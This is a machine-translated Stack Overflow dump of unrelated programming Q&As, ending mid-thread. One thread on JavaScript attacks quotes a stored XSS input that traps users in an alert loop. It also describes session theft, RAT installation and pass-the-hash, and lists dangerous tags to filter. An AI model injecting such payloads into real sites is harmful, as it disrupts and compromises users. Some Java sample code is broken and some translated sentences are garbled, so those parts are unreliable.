确保你真的想要“真正的”随机数。必须测量随机性的物理来源，并且测量过程会引入一些偏差。对于某些应用程序，“伪”随机数实际上比“真”随机数更可取。它们可以具有更好的统计特性，并且您可以更快地生成它们。另一方面，如果你不小心的话，你可能会用伪随机数生成器[射你自己的脚。](http://www.codeproject.com/KB/recipes/pitfalls_random_number.aspx)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-12-19T14:19:10.087

Java Cryptographic [Architecture](http://java.sun.com/javase/6/docs/technotes/guides/security/crypto/CryptoSpec.html)需要加密强的随机数。它包含@saua 提到的[SecureRandom类。](http://java.sun.com/javase/6/docs/technotes/guides/security/crypto/CryptoSpec.html#SecureRandom)

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-12-19T14:58:16.297

没有**真正的**随机数生成器，因为它们都以一种或另一种方式依赖确定性程序来计算随机数，因此，无论生成的数字看起来如何遵循真正的随机分布，它们都可能是隐藏的一部分 - 而且非常复杂模式，因此它们是[Pseudo-Random](http://en.wikipedia.org/wiki/Pseudorandom#Almost_random)。但是，您可以实现自己的随机数生成器，您可以在[Numerical Recipes in C, Second Edition - Section 7 中](http://www.nrbook.com/a/bookcpdf.php)阅读一些不错的、计算成本低的方法。高温高压

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2013-06-18T05:35:48.910

澄清一下：宇宙中唯一真正的随机生成器是**Quantum Random Bit Generator**。没有其他机制可以向您保证，生成的位是完全随机的，因为即使现在您无法预测结果，也无法保证您将来无法预测。

> 量子随机位发生器（QRBG121），它是一种快速的非确定性随机位（数）发生器，其随机性依赖于半导体中光子发射的量子物理过程的内在随机性以及随后的光电效应检测。在这个过程中，光子是随机检测的，彼此独立地一个接一个。检测到的光子的时序信息用于生成随机二进制数字 - 位。这种方法的独特之处在于它只使用一个光子探测器来产生零和一，从而导致非常小的偏差和对组件变化和老化的高度免疫。此外，通过光电倍增管 (PMT) 检测单个光子。与固态光子探测器相比，PMT'

更多信息，例如这里： [http ://random.irb.hr/](http://random.irb.hr/)

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-12-22T19:37:45.263

对于大多数目的，伪随机数绰绰有余。如果您只需要一个简单的随机数，即。在 30% 的时间里这样做，那么作为种子的时间戳就是你想要的。如果这必须是安全的随机数，例如洗牌，你想更仔细地选择你的种子，那里有很好的资源来创建安全的种子。

使用种子的原因是能够“召回”算法生成的相同随机数序列。一个非常好的场景是，当您对某种类型进行随机模拟并且想要重复特定实验时，您只需使用相同的种子。

要获得比与 Java 捆绑的 PRNG 更好的 PRNG，请查看[Mersenne Twister](http://en.wikipedia.org/wiki/Mersenne_twister)。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-12-19T15:26:11.467

在大学里，我的任务是实现随机生成器。我创建了这样的随机数生成器：创建桌面窗口并要求用户单击窗口上的随机位置，每次单击后我获取单击点的坐标。我认为那很随意。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-19T17:11:53.967

另请参阅此 SO 问题：[Alternative Entropy Sources](https://stackoverflow.com/questions/300854/alternative-entropy-sources#300901)

几年前我发现了[HotBits——这些数字是由放射性衰变产生的，真正的随机数字。](http://www.fourmilab.ch/hotbits/)

有一个可供访问的 java 库[`randomx`](http://www.fourmilab.ch/hotbits/source/randomX/randomX.html)

每天可以下载多少个数字是有限制的，但我总是很开心将这些用作 RNG 的真正随机种子。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-12-22T19:23:16.557

维基百科引用：约翰·冯·诺依曼有句名言：“任何使用算术方法产生随机数的人都处于犯罪状态。”

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-09-20T04:30:54.017

据我所知，他们与机器的**时间**一起工作......！

**随机数的用途**

> 随机数已经使用了数千年。无论是掷硬币还是掷骰子，目标都是让最终结果由随机机会决定。计算机中的随机数生成器是类似的——它们试图实现不可预测的随机结果。

**这可以制作真正的随机数吗？**

是的 ！

> 为了生成“真正的”随机数，计算机会测量发生在计算机之外的某种物理现象。
> 
> 举一个更日常的例子，计算机可能依赖于大气噪声，或者只是使用你在键盘上按键的确切时间作为不可预测的数据或熵的来源。例如，您的计算机可能会注意到您在下午 2 点之后的 0.23423523 秒时按下了一个键。获取足够多的与这些按键相关的特定时间，您将获得可用于生成“真实”随机数的熵源。

**NSA 和 Intel 的硬件随机数生成器**

> 为了使开发人员的工作更轻松并帮助生成安全的随机数，英特尔芯片包括一个基于硬件的随机数生成器，称为 RdRand。该芯片在处理器上使用熵源，并在软件请求时向软件提供随机数。

来源：[HowToGeek？](https://www.howtogeek.com/183051/htg-explains-how-computers-generate-random-numbers/)

以防万一您可能需要在 Android 中生成随机数...我使用加速度计数据来获取真正的基于物理的随机数 :)

# javascript - Javascript 对你做了什么恶意的事情？

> ID：381042
> 
> 赞同：4
> 
> 时间：2008-12-19T14:04:59.680
> 
> 标签：javascript, security

我问了一个问题： [那些不使用 Javascript 的人是怎么回事](https://stackoverflow.com/questions/373818/whats-with-those-do-not-use-javascript-people)，很多人说 Javascript 允许通过客户端攻击进行安全漏洞利用。

所以我需要跟进并了解这些攻击的性质有多严重：

我想听听一些关于通过 Javascript 直接或间接导致或允许对您的计算机或网络造成的实际攻击或损害的详细描述。

具体来说，是否对您的计算机或网络造成了任何物理损坏？你有没有丢失任何数据？你的软件有损坏吗？如果发生任何损坏，修复需要多长时间，费用是多少？

或者攻击在造成任何伤害之前就停止了，它是如何停止的？这花了多长时间，花了多少钱？

我不认为弹出窗口是一种攻击。它们只是一个烦恼，可以在不禁用 Javascript 的情况下轻松阻止。

请仅详细说明您个人参与过的攻击。我相信你作为程序员的智慧，但我不太相信第三方的故事，原因可能是别的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T14:48:28.953

嗯...[可以 0wn 你](http://www.milw0rm.com/exploits/7477)。我的意思是字面上可以拥有整台计算机，安装木马。

我已经看到并成功完成了许多 XSS 攻击，这些攻击导致窃取管理会话并控制整个应用程序。我已经看到并完成了客户端攻击，例如上面的链接，这导致安装另一个应用程序（RAT）并控制整个盒子。

之后作为攻击者就可以开始攻击内部网络了，比如你可以拥有路由器然后控制整个公司的流量，你可以攻击域控制器，或者你可以使用**pass hash工具**或者类似的工具来窃取本地凭据并使用这些凭据攻击其他系统。在此之后，一切都与其他计算机的安全有关（如果浏览器以最低权限而不是管理员帐户运行，则为本地计算机）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T15:32:13.450

在我的网站[nizzote.com/welcomeSO](http://nizzote.com/welcomeSO)

我使用 <textarea> 收集我清理过的文本，但有人保存了 </texarea><script> for (var i = 1; i > 0; i++) {alert("press ok one time");}

当页面再次加载时，它会让你卡在一个警告框中，你必须关闭浏览器才能退出。

我很快就看到了，并对所有输入进行了 htmlencoded 以解决问题。(c# httputility.htmlencode(string) ) 没有真正的损坏或成本，而且修复很快。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T14:35:02.550

好吧，任何恶意 JavaScript 最终都会通过浏览器功能发挥作用，因此[这个概念验证演示](http://www.mikeonads.com/2008/07/13/using-your-browser-url-history-estimate-gender/)可能符合您的要求。它利用页面可以动态创建指向给定 URL 的链接这一事实，然后检查它是什么颜色，以确定您的浏览器是否认为该站点是您浏览历史的一部分。该链接所做的只是尝试猜测您的性别，但同样的想法也可用于攻击 - 例如，它可以测试主要银行的 URL，并为您提供针对您使用的任何银行定制的网络钓鱼攻击。

当然，这可能（应该）在未来的浏览器版本中得到修复，但大多数漏洞利用都是如此。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T14:50:48.870

不要让您的最终用户插入允许 <script> 标签、<style> 标签、style 属性或任何 on_ 的 HTML 标记？event 属性...并查看 href 和 src 属性的内容

例如，如果你有一个博客，不要让他们用任何 HTML 来评论。

为什么？

1.) script 标签很明显，他们可以为所欲为

2.) style标签和style属性不是很明显，但是在IE中可以使用behavior或者expression属性来调用脚本内容

3.) 任何 onclick、onmouseover 等属性显然都可以包含脚本内容，因此也要避免使用它。

4.) 观察 href 和 src 属性，如果它们包含“javascript:”协议，那么你也暴露了脚本。

更新：将 <iframe>、<object> 和 <embed> 也作为危险标签加入...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-20T05:07:38.810

我个人没有遇到任何问题，只是偶尔出现一些浏览器崩溃（这主要是因为代码写得不好）。不要读太多，我绝对理解 javascript 是一个相当广泛的攻击媒介；我只是说对于大概 80-90% 的互联网用户而不是网络应用程序开发人员来说是正确的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-20T05:11:31.160

让我无法享受静态链接的强类型语言。并与某个名叫克罗克福德的人建立了一种不由自主的依赖关系。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T16:44:30.357

对客户端站点上易受攻击的输入脚本的注入攻击导致通过自动 MS SQL 脚本将木马加载脚本主体附加到其数据库中的每个文本字段。我们最终使用脚本否定自己来清理它，但在漏洞被堵塞之前，相当多的人通过中国的服务器感染了某种病毒。

这适用于这一点，因为注入孔是通过 javascript 引用（AJAX 调用）创建的，并且可交付成果也是通过随后注入的 javascript 引起的。

# .net - 哪个 .net ORM 可以处理这种情况

> ID：381049
> 
> 赞同：1
> 
> 时间：2008-12-19T14:06:59.910
> 
> 标签：.net, orm

从[上一个问题](https://stackoverflow.com/questions/29040/linq-to-sql-can-i-eager-load-only-one-field-in-a-joined-table)中，我了解到 Linq to SQL 不能只急切加载foreingKey 表的某些文件。

所以我问.net ORM 可以支持什么，在实体类中包含这种类型的语句，只有一个 DB 调用，并且无需手动将结果与对象映射。

```
 -- simplified for clarity
  SELECT Order.*, Product.Name, Customer.Name, OrderType.Name, Provider.Name
  FROM Order
      INNER JOIN Product on Order.ProductID = Product.ProductID
      INNER JOIN Customer on Order.CustomerID = Customer.CustomerID
      INNER JOIN OrderType on Order.OrderTypeID = OrderType.OrderTypeID
      INNER JOIN Provider on Order.ProviderID = Provider.ProviderID 
```

我想让它尽可能简单（尽量避免 NHibernate 等）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T14:24:26.270

作为预测的一部分，LINQ-to-SQL 应该处理这个问题 - 你试过了吗

```
select new {Order = order, ProductName = order.Product.Name,
             CustomerName = order.Customer.Name,
             OrderType = order.OrderType.Name } // etc 
```

如果您希望这些属性成为对象模型本身的一部分……更棘手，并且与实体不太相关。您可以在部分类中添加属性，但您必须执行大量加载选项才能使它们快速加载。实际上，考虑到对象模型的复杂性，这可能不值得。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-07-03T20:31:44.577

[DataObjects.Net](http://wiki.dataobjects.net)以与 LINQ 2 SQL 完全相同的方式处理此问题：

```
from order in Query<Order>.All
where ...
select new {
  Order = order, 
  ProductName = order.Product.Name,
  CustomerName = order.Customer.Name,
  OrderType = order.OrderType.Name 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T14:26:03.833

有时您只需要“自己完成工作”，而不是依赖 ORM 来实现特定功能。这可能是其中之一。您可以将此信息放入存储过程中，并将对象作为参数传递。

# winapi - RegSaveKey 返回 ERROR_PRIVILEGE_NOT_HELD

> ID：381055
> 
> 赞同：5
> 
> 时间：2008-12-19T14:11:05.127
> 
> 标签：winapi

我正在尝试使用 RegSaveKey() API 将特定注册表项的内容保存到文件中：

```
HKEY key;
LRESULT result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\MyProduct", 0, KEY_ACCESS_ALL, &key);
result = RegSaveKey(key, L"c:\\temp\\saved.reg", NULL); 
```

但是， RegSaveKey() 正在返回`ERROR_PRIVILEGE_NOT_HELD`。SDK 文档说“调用进程必须`SE_BACKUP_NAME`启用权限”。该进程作为本地管理员或作为服务运行。

有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-19T19:53:14.953

尽管作为本地管理员或作为服务运行，您可能没有默认启用“备份”权限。在尝试保存注册表项之前，您需要启用此权限。

MSDN 有一个关于如何在 C/C++ 中启用安全权限的好例子：http: [//msdn.microsoft.com/en-us/library/aa446619](http://msdn.microsoft.com/en-us/library/aa446619(VS.85).aspx) (VS.85).aspx 。如果包含该页面上定义的示例函数，则可以调用：

```
HANDLE ProcessToken;

if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ProcessToken)) {

    SetPrivilege(ProcessToken, SE_BACKUP_NAME, TRUE);

    // Save reg key now...
    ...
} 
```

[或者， wayback machine 上](http://web.archive.org/web/20121025055756/http://support.microsoft.com:80/kb/297060)还有一个基于 VB 的示例。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-03-02T10:44:20.600

请注意，鲁本答案的 SetPrivilege() 是用户定义的，根据 MSDN，函数体是这样的......

```
BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
    )  
{
TOKEN_PRIVILEGES tp;
LUID luid;

if ( !LookupPrivilegeValue( 
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid ) )        // receives LUID of privilege
{
    printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
    return FALSE; 
}

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
    tp.Privileges[0].Attributes = 0;

// Enable the privilege or disable all privileges.

if ( !AdjustTokenPrivileges(
       hToken, 
       FALSE, 
       &tp, 
       sizeof(TOKEN_PRIVILEGES), 
       (PTOKEN_PRIVILEGES) NULL, 
       (PDWORD) NULL) )
{ 
      printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
      return FALSE; 
} 

if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

{
      printf("The token does not have the specified privilege. \n");
      return FALSE;
} 

return TRUE;
} 
```

# user-interface - 如何处理 J2ME GUI 应用程序中的按键

> ID：381062
> 
> 赞同：0
> 
> 时间：2008-12-19T14:13:54.857
> 
> 标签：user-interface, canvas, java-me, midp, midp-2.0

`javax.microedition.lcdui.*`我使用（Gauge、List、ChoiseGroup）GUI 元素在 J2ME 中为手机编写了蓝牙电视遥控器。

我希望手机与我的电视进行实时交互，我想找到方法将使用 GUI 元素执行的用户输入立即（如更改频道或更改音量）发送到电视。

由于我想与我的电视进行实时交互，我想找到一种方法来立即将使用 GUI 元素执行的用户输入（例如更改频道或更改音量）发送到电视。

使用`javax.microedition.lcdui.Command`/`CommandListner`并`commandAction`不起作用，因为它们只需要识别使用侧面按钮选择的命令。我想要一些可以识别任何按下的键的东西。

我发现它`Javax.microedition.lcdui.Canvas.keyPressed`可以处理手机上按下的任何键，但我不知道如何使 Canvas 与像 Gauge 这样的 MIDP GUI 元素一起工作。它们不能像命令一样添加。

我是否必须想办法为这些 GUI 元素构建界面以使它们与 Canvas 一起使用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T15:00:53.327

如果有人感兴趣，我自己刚刚找到了一个半解决方案：“javax.microedition.lcdui.ItemStateListener”。该函数可以实时处理 GUI 项的状态（或状态变化）。它不是 keyPress，但这也适用于我的应用程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T14:45:49.580

根据此[常见问题解答](http://www.j2meforums.com/wiki/index.php/FAQ#How_do_I_capture_keypresses_on_a_Form.2FList.2FAlert.3F)，您无法执行您要求的操作。这是关于 MIDP 1.0，但我相信它也适用于 MIDP 2.0。如果它只是您需要的量规，您可以轻松地自己绘制它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T14:16:36.597

据我所知，这只能使用[Canvas](http://java.sun.com/javame/reference/apis/jsr118/javax/microedition/lcdui/Canvas.html)来完成。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-23T16:38:01.350

我强烈建议您在 Canvas 对象上绘制类似 Gauge 的项目，或者按照“zhengtonic”于 12 月 19 日 15:00 给出的建议进行操作。我不知道解决这个问题的任何其他方法，我曾经在那里，但使用了我提供的第一个选项

# asp.net-mvc - asp.net mvc - 一门过滤器

> ID：381063
> 
> 赞同：1
> 
> 时间：2008-12-19T14:14:06.963
> 
> 标签：asp.net-mvc, post, filter, get

在绑定到控制器操作之前，我需要触发一个过滤方法，其中包含来自 http 请求的 GET 或 POST 值中的所有字符串

我可以在 Global.asax.cs 中做吗？如果是的话，你能给我更多的细节或例子（很好）吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-31T23:46:11.027

您可以在 Global.asax.cs 中为*所有*请求执行此操作

```
protected void Application_BeginRequest(object sender, EventArgs e) {
   //Look at HttpContext.Current.Request to grab request values 
} 
```

模型绑定发生在操作过滤器运行之前。如果你想编写一个在模型绑定之前运行的过滤器，你可以编写一个在模型绑定之前运行的 IAuthorizationFilter。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T14:35:37.527

我相信您可以使用动作过滤器。

试试这篇[文章](http://www.singingeels.com/Articles/Logging_with_ASPNET_MVC_Action_Filters.aspx)。

# java - 如何在 Java 中替换文本中的字符串？

> ID：381066
> 
> 赞同：5
> 
> 时间：2008-12-19T14:15:13.310
> 
> 标签：java, regex, perl

在一个项目中，我们的文本文件如下所示：

```
mv A, R3
mv R2, B
mv R1, R3
mv B, R4
add A, R1
add B, R1
add R1, R2
add R3, R3
add R21, X
add R12, Y
mv X, R2 
```

我需要根据以下内容替换字符串，但我正在寻找更通用的解决方案。

```
R1  => R2
R2  => R3
R3  => R1
R12 => R21
R21 => R12 
```

我知道我可以在 Perl 中做到这一点，下面代码中的 replace() 函数，但真正的应用程序是用 Java 编写的，所以解决方案也需要用 Java 编写。

```
#!/usr/bin/perl
use strict;
use warnings;

use File::Slurp qw(read_file write_file);

my %map = (
    R1  => 'R2',
    R2  => 'R3',
    R3  => 'R1',
    R12 => 'R21',
    R21 => 'R12',
);

replace(\%map, \@ARGV);

sub replace {
    my ($map, $files) = @_;

    # Create R12|R21|R1|R2|R3
    # making sure R12 is before R1
    my $regex = join "|",
                sort { length($b) <=> length($a) }
                keys %$map;

    my $ts = time;

    foreach my $file (@$files) {
        my $data = read_file($file);
        $data =~ s/\b($regex)\b/$map{$1}/g;
        rename $file, "$file.$ts";       # backup with current timestamp
        write_file( $file, $data);
    }
} 
```

您对 Java 实现的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T15:54:33.343

在过去的两周里，我实际上不得不多次使用这种算法。所以这里它是世界上第二冗长的语言......

```
import java.util.HashMap;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

/*
R1  => R2
R2  => R3
R3  => R1
R12 => R21
R21 => R12
*/

String inputString 
    = "mv A, R3\n"
    + "mv R2, B\n"
    + "mv R1, R3\n"
    + "mv B, R4\n"
    + "add A, R1\n"
    + "add B, R1\n"
    + "add R1, R2\n"
    + "add R3, R3\n"
    + "add R21, X\n"
    + "add R12, Y\n"
    + "mv X, R2"
    ;

System.out.println( "inputString = \"" + inputString + "\"" );

HashMap h = new HashMap();
h.put( "R1",  "R2" );
h.put( "R2",  "R3" );
h.put( "R3",  "R1" );
h.put( "R12", "R21" );
h.put( "R21", "R12" );

Pattern      p       = Pattern.compile( "\\b(R(?:12?|21?|3))\\b");
Matcher      m       = p.matcher( inputString );
StringBuffer sbuff   = new StringBuffer();
int          lastEnd = 0;
while ( m.find()) {
    int mstart = m.start();
    if ( lastEnd < mstart ) { 
        sbuff.append( inputString.substring( lastEnd, mstart ));
    }
    String key   = m.group( 1 );
    String value = (String)h.get( key );
    sbuff.append( value );
    lastEnd = m.end();
}
if ( lastEnd < inputString.length() ) { 
    sbuff.append( inputString.substring( lastEnd ));
}

System.out.println( "sbuff = \"" + sbuff + "\"" ); 
```

这可以通过这些类进行 Java 化：

```
import java.util.Comparator;
import java.util.Iterator;
import java.util.Map;
import java.util.TreeSet;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

interface StringReplacer { 
    public CharSequence getReplacement( Matcher matcher );
}

class Replacementifier { 

    static Comparator keyComparator = new Comparator() { 
         public int compare( Object o1, Object o2 ) {
             String s1   = (String)o1;
             String s2   = (String)o2;
             int    diff = s1.length() - s2.length();
             return diff != 0 ? diff : s1.compareTo( s2 );
         }
    };
    Map replaceMap = null;

    public Replacementifier( Map aMap ) { 
        if ( aMap != null ) { 
            setReplacements( aMap ); 
        }
    }

    public setReplacements( Map aMap ) { 
        replaceMap = aMap;
    }

    private static String createKeyExpression( Map m ) { 
        Set          set = new TreeSet( keyComparator );
        set.addAll( m.keySet());
        Iterator     sit = set.iterator();
        StringBuffer sb  = new StringBuffer( "(" + sit.next());

        while ( sit.hasNext()) { 
            sb.append( "|" ).append( sit.next());
        }
        sb.append( ")" );
        return sb.toString();
    }

    public String replace( Pattern pattern, CharSequence input, StringReplacer replaceFilter ) {
        StringBuffer output  = new StringBuffer();
        Matcher      matcher = pattern.matcher( inputString );
        int          lastEnd = 0;
        while ( matcher.find()) {
            int mstart = matcher.start();
            if ( lastEnd < mstart ) { 
                output.append( inputString.substring( lastEnd, mstart ));
            }
            CharSequence cs = replaceFilter.getReplacement( matcher );
            if ( cs != null ) { 
                output.append( cs );
            }
            lastEnd = matcher.end();
        }
        if ( lastEnd < inputString.length() ) { 
            sbuff.append( inputString.substring( lastEnd ));
        }
    }

    public String replace( Map rMap, CharSequence input ) {
        // pre-condition
        if ( rMap == null && replaceMap == null ) return input;

        Map     repMap = rMap != null ? rMap : replaceMap;
        Pattern pattern  
            = Pattern.compile( createKeyExpression( repMap ))
            ;
        StringReplacer replacer = new StringReplacer() { 
            public CharSequence getReplacement( Matcher matcher ) {
                String key   = matcher.group( 1 );
                return (String)repMap.get( key );
            }
        };
        return replace( pattern, input, replacer ); 
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T14:33:42.273

perl 解决方案的优点是一次性替换所有字符串，有点“事务性”。如果您在 Java 中没有相同的选项（而且我想不出办法），您需要小心替换 R1=>R2，然后 R2=>R3。在这种情况下，R1 和 R2 最终都被 R3 替换。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-20T01:08:48.107

这是一种使用 Matcher 的低级 API 一次性完成此操作的不那么冗长的方法：`appendReplacement()`和`appendTail()`.

```
import java.util.*;
import java.util.regex.*;

public class Test
{
  public static void main(String[] args) throws Exception
  {
    String inputString 
      = "mv A, R3\n"
      + "mv R2, B\n"
      + "mv R1, R3\n"
      + "mv B, R4\n"
      + "add A, R1\n"
      + "add B, R1\n"
      + "add R1, R2\n"
      + "add R3, R3\n"
      + "add R21, X\n"
      + "add R12, Y\n"
      + "mv X, R2"
      ;

      System.out.println(inputString);
      System.out.println();
      System.out.println(doReplace(inputString));
  }

  public static String doReplace(String str)
  {
     Map<String, String> map = new HashMap<String, String>()
     {{
        put("R1", "R2");
        put("R2", "R3");
        put("R3", "R1");
        put("R12", "R21");
        put("R21", "R12");
     }};

     Pattern p = Pattern.compile("\\bR\\d\\d?\\b");
     Matcher m = p.matcher(str);
     StringBuffer sb = new StringBuffer();
     while (m.find())
     {
       String repl = map.get(m.group());
       if (repl != null) 
       {
         m.appendReplacement(sb, "");
         sb.append(repl);
       }
     }
     m.appendTail(sb);
     return sb.toString();
  }
} 
```

请注意，`appendReplacement()`处理替换字符串以使用捕获组中的文本替换*$n*序列，在这种情况下我们不希望这样做。为避免这种情况，我将它传递给一个空字符串，然后改用 StringBuffer 的`append()`方法。

[Elliott Hughes 已在此处](http://elliotth.blogspot.com/2004/07/java-implementation-of-rubys-gsub.html)发布了该技术的预打包实现。（他倾向于引用他编写的其他实用程序类，因此您可能希望在`main()`编译之前删除他的方法中的测试。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-11-12T12:06:10.257

我的建议是在读取文件本身时替换字符串您可以使用***RandomAccessFile***。在逐个字符地读取文件时，您实际上可以检查模式，然后进行替换。然后您可以一次将所有内容写入文件。我认为这将为您节省更多时间。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2008-12-19T14:20:53.237

您可以使用 HashMap：

```
Map<String, String> map = new HashMap<String, String>();
map.put("R1", "R2");
map.put("R2", "R3");

for(String key: map.keySet()) {
  str.replaceAll(key, map.get(key));
} 
```

replaceAll 也处理正则表达式。

编辑：正如许多人指出的那样，上述解决方案不起作用，因为它不处理循环替换。所以这是我的第二种方法：

```
public class Replacement {

    private String newS;
    private String old;

    public Replacement(String old, String newS) {
        this.newS = newS;
        this.old = old;
    }

    public String getOld() {
        return old;
    }

    public String getNew() {
        return newS;
    }
}

SortedMap<Integer, Replacement> map = new TreeMap<Integer, Replacement>();

map.put(new Integer(1), new Replacement("R2", "R3"));
map.put(new Integer(2), new Replacement("R1", "R2"));

for(Integer key: map.keySet()) {
   str.replaceAll(map.get(key).getOld(), map.get(key).getNew());
} 
```

只要您正确订购替换件并防止循环替换件，此方法就可以工作。有些替换是不可能的：

```
R1 -> R2
R2 -> R3
R3 -> R1 
```

您必须为这些使用一些“临时”变量：

```
R1 -> R@1
R2 -> R@3
R3 -> R1
R@(\d{1}) -> R\1 
```

您可以编写一个库来为您完成所有这些工作。

# asp.net-mvc - ASP.NET MVC 本地化最佳实践？

> ID：381070
> 
> 赞同：18
> 
> 时间：2008-12-19T14:16:50.887
> 
> 标签：asp.net-mvc, localization

我需要本地化 asp mvc 应用程序的最佳实践方面的帮助，我看到 Oxite 在 BaseController 中有一个名为 Localize 的基本方法，但是本地化是视图还是控制器的任务？或者我应该使用 resx 文件/或使用 db 表？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-12-19T15:41:53.663

创建您自己的 Html 帮助程序并像使用它一样使用它`<%= Html.Resource("Name") %>`

详细信息在[博客](https://web.archive.org/web/20081222191210/http://blog.eworldui.net/post/2008/05/ASPNET-MVC---Localization.aspx)文章中。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2010-02-23T07:31:30.417

[这里](http://adamyan.blogspot.com/2010/02/aspnet-mvc-2-localization-complete.html)有一个很好的解决方案

本文涵盖了本地化 asp.net mvc app 的所有方面

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-17T14:33:01.010

由于这是一个一年的问题，我不知道我在这里回答的范围。最近我遇到了这样的情况，即我需要在我的mvc站点中实现不同语言的本地化。

我考虑过使用`Resource`文件。它很容易实现，但问题是在开发阶段，我们需要指定本地化的字符串。因此，如果它是多语言支持，我们需要为每种语言制作资源文件。如果客户要更改或添加新语言，这非常困难，我们需要提供构建。

其次，我考虑`Satelite Assemblies`. 它也类似于 Resource，但它可以自由编辑程序集并将其放回 bin 文件夹。这也需要客户/开发人员付出很多努力。

第三，我考虑存储在数据库中。这种方法很好，我们有一些机制可以从服务器读取数据。这需要一次努力，并且客户没有任何可靠的 .

我重写了一个自定义`DisplayNameAttributre`并从构造函数中传递 DB 并获取要渲染的数据

根据您的要求，它应该向您显示视图。

**资源管理器**

```
/// <summary>
    ///  Extended display attribute which will handles the request
    ///  It will call every time when the property is rendered (return View() - from controller)
    /// </summary>
    public class ResourceManagerAttribute : DisplayNameAttribute
    {
        public ResourceManagerAttribute(string resourceKey, string resourceNameSpace = "")
            : base(GetDisplayName(resourceKey, resourceNameSpace))
        { }

        private static string GetDisplayName(string resourceKey, string resourceNameSpace = "")
        {
            // get the browser's prefered language.

            string browserLanguage = HttpContext.Current.Request.UserLanguages.First();

            // Get the locale data for that property and displays.
            switch (browserLanguage)
            {
                case "en-US": return "Eng " + resourceKey;
             // calls db based on resource key
                case "hi": return "Hin " + resourceKey;

            }
            return "-- Not Implemented Now -- ";
        } 
```

* * *

**视图模型**

```
public class HomeViewModel
    {
        //calls the resource
        [ResourceManager("MID")]
        public int MID { get; set; }
        [ResourceManager("Name")]
        public string Name { get; set; }
        [ResourceManager("Addess")]
        public string Addess { get; set; }
    } 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2011-02-25T08:30:33.027

MVC 实际上更多的是使用正确的视图来完成正确的工作。把所有东西都放在一个资源文件中是非常丰富的。将资源文件用于小事情是很好的，但对于像描述页面这样的较大页面，最好在每种文化中都有大量内容的视图。例如使用以下结构：~/Views/en-US/Home/Index.aspx ~/Views/pt-BR/Home/Index.aspx 或此结构：~/Views/Home/Index.en-US.aspx ~/Views/Home/Index.en-US.aspx

阅读博客了解如何操作：http: [//blog.oimae.com/2011/02/20/cultured-view-engine-for-mvc/](http://blog.oimae.com/2011/02/20/cultured-view-engine-for-mvc/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-20T17:19:03.953

如果要本地化的字符串是由视图生成的（例如文本字段前面的标签），那么它的本地化应该在视图中。

如果字符串是由控制器生成的，它的本地化也应该在那里。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-21T17:19:04.950

我最好去创建一个自定义 MetadataProvider 并使用模型的约定。类似于模型命名空间的 1 个资源文件和 ModelName.PropertyName -> value 之类的约定

对于验证器、常用按钮等资源文件。

对于视图文本，我实际上是在尝试找到一个好方法。可能是编译前的视图预处理和本地化文本的自定义范围，因此预处理可以使用默认语言为每个视图创建资源文件。

# java - 用于 Web 应用程序的 Glassfish v3 Prelude 与 Springsource dm 服务器的优缺点？

> ID：381071
> 
> 赞同：7
> 
> 时间：2008-12-19T14:16:52.353
> 
> 标签：java, spring, jakarta-ee, glassfish

这两个应用服务器至少部分基于 OSGI。一个（Glassfish）显然是 Java EE，而另一个不是。现在我正处于为新项目选择平台的阶段，很自然的选择是 Glassfish v3 Prelude。这确实提出了一个问题，也许我们应该使用 S2AP。

那么问题是：springsource dm 服务器是否提供了任何令人信服的理由来使用它而不是 Glassfish？反之亦然。

* * *

## 回答 #1

